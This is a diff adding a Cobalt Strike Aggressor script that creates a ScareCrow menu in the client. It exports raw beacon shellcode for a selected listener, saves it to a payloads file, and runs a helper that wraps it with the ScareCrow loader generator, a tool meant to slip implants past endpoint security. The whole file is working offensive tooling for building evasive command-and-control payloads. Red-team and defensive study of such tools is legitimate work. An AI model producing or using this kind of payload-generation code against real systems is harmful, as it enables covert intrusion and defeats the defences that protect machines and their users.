@@ -1,0 +1,37 @@
+$script_path = "path to ScareCrow Script directory e.g. /home/user/Scare/ScareCrow-CobaltStrike";
+$scarecrow_executable = "https://github.com/optiv/ScareCrow path to the compiled ScareCrow executable e.g.  /home/user/ScareCrow/ScareCrow";
+$python3 = "/usr/bin/python3";
+
+menubar("ScareCrow", "scare_crow");
+
+popup scare_crow {
+	item "&ScareCrow" {
+		ScareCrow();
+	}
+}
+
+sub ScareCrow {
+	$dialog = dialog("ScareCrow Payload Generator (S)", %(listener => "", payload_type => "Payload Type: ", output => "output: "), &ScareCrowCallback);
+	drow_listener_stage($dialog, "listener", "Listener: ");
+    drow_combobox($dialog, "payload_type", "Payload Type: ", @("Stageless"));
+    drow_combobox($dialog, "architecture", "Architecture: ", @("x64"));
+    drow_combobox($dialog, "loader", "Loader: ", @("binary"));
+    drow_text($dialog, "domain", "Domain: ");
+	dbutton_action($dialog, "Generate");
+	dialog_show($dialog);
+}
+
+sub ScareCrowCallback {
+	if ($3['listener'] eq "") {
+		show_message("No listener specified!");
+		exit();
+	}
+
+    $shellcode = artifact_payload($3['listener'], "raw", $3['architecture']);
+	
+	mkdir($script_path . "/payloads");
+	$shellcodefile = openf(">" . $script_path . "/payloads/scbeacon.bin");
+	writeb($shellcodefile, $shellcode);
+	closef($shellcodefile);
+	$pythonprocess = exec($python3 . " " . $script_path . "/Helper.py " . $scarecrow_executable . " " . $script_path . "/payloads/scbeacon.bin " . $3['loader'] . " " . $3['domain']);
+}
